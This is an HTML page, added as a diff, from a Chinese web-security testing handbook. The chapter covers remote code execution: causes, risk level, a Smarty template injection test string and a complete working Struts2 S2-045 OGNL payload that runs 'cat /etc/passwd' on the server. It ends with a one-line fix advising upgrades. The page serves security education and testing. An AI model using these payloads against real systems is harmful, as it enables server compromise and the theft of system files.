@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>远程代码执行 « 倾旋的博客</title>
+  <meta name="description" content="《Web安全测试学习手册》- 远程代码执行">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2018-03-22/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">远程代码执行</h1>
+    <p class="post-meta">Mar 22, 2018</p>
+  </header>
+
+  <article class="post-content">
+    <p>《Web安全测试学习手册》- 远程代码执行
+<!--more--></p>
+<ul id="markdown-toc">
+  <li>
+<a href="#0x00-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C---%E4%BB%8B%E7%BB%8D" id="markdown-toc-0x00-远程代码执行---介绍">0x00 远程代码执行 - 介绍</a>    <ul>
+      <li><a href="#1%E4%BB%80%E4%B9%88%E6%98%AF%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C" id="markdown-toc-1什么是远程代码执行">1）什么是远程代码执行</a></li>
+      <li><a href="#2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E7%89%B9%E7%82%B9" id="markdown-toc-2远程代码执行的特点">2）远程代码执行的特点</a></li>
+    </ul>
+  </li>
+  <li><a href="#0x01-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C---%E9%A3%8E%E9%99%A9%E7%AD%89%E7%BA%A7" id="markdown-toc-0x01-远程代码执行---风险等级">0x01 远程代码执行 - 风险等级</a></li>
+  <li><a href="#0x02-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C---%E5%8E%9F%E7%90%86" id="markdown-toc-0x02-远程代码执行---原理">0x02 远程代码执行 - 原理</a></li>
+  <li><a href="#0x03-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C---%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF" id="markdown-toc-0x03-远程代码执行---常见场景">0x03 远程代码执行 - 常见场景</a></li>
+  <li>
+<a href="#0x04-%E6%B5%8B%E8%AF%95%E6%96%B9%E6%A1%88" id="markdown-toc-0x04-测试方案">0x04 测试方案</a>    <ul>
+      <li><a href="#php%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF---%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C" id="markdown-toc-php中常见场景---模板引擎代码执行">PHP中常见场景 - 模板引擎代码执行</a></li>
+      <li><a href="#java-struts2-s2-045" id="markdown-toc-java-struts2-s2-045">Java Struts2 （S2-045）</a></li>
+    </ul>
+  </li>
+  <li><a href="#0x05-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88" id="markdown-toc-0x05-修复方案">0x05 修复方案</a></li>
+</ul>
+
+<h2 id="0x00-远程代码执行---介绍">0x00 远程代码执行 - 介绍</h2>
+
+<h3 id="1什么是远程代码执行">1）什么是远程代码执行</h3>
+
+<p>远程命令执行 英文名称：<strong>RCE (remote code execution)</strong> ，简称<strong>RCE</strong>漏洞，是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p>
+
+<h3 id="2远程代码执行的特点">2）远程代码执行的特点</h3>
+
+<p>远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。</p>
+
+<h2 id="0x01-远程代码执行---风险等级">0x01 远程代码执行 - 风险等级</h2>
+
+<p><strong>高</strong></p>
+
+<h2 id="0x02-远程代码执行---原理">0x02 远程代码执行 - 原理</h2>
+
+<p>由于开发人员编写源码，没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。命令注入攻击中WEB服务器没有过滤类似system(),eval()，exec()等函数是该漏洞攻击成功的最主要原因。</p>
+
+<h2 id="0x03-远程代码执行---常见场景">0x03 远程代码执行 - 常见场景</h2>
+
+<ul>
+  <li>使用了危险函数的Web应用</li>
+  <li>低版本的Java语言Struts框架</li>
+</ul>
+
+<h2 id="0x04-测试方案">0x04 测试方案</h2>
+
+<h3 id="php中常见场景---模板引擎代码执行">PHP中常见场景 - 模板引擎代码执行</h3>
+
+<p>Smarty简介</p>
+
+<blockquote>
+  <p>Smarty是一个PHP的模板引擎。更明确来说，它可以帮助开发者更好地 分离程序逻辑和页面显示。最好的例子，是当程序员和模板设计师是不同的两个角色的情况，而且 大部分时候都不是同一个人的情况。</p>
+
+  <p>CVE-ID : CVE-2017-1000480</p>
+</blockquote>
+
+<p>产生原因：由于未对用户的输入点进行过滤，导致经过eval函数，造成代码执行</p>
+
+<p>测试Payload：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*/phpinfo();/*
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-16/0x00.png" alt="0x00"></p>
+
+<h3 id="java-struts2-s2-045">Java Struts2 （S2-045）</h3>
+
+<p>Struts 简介</p>
+
+<blockquote>
+  <p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。</p>
+
+  <p>CVE-ID : CVE-2017-5638</p>
+</blockquote>
+
+<p>产生原因：由于未对用户输入点进行过滤，被带入ErrorMessage，当做OGLN表达式解析，造成代码执行</p>
+
+<p>测试Payload：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-16/0x01.png" alt="0x01"></p>
+
+<h2 id="0x05-修复方案">0x05 修复方案</h2>
+
+<p>升级插件、框架新版本</p>
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
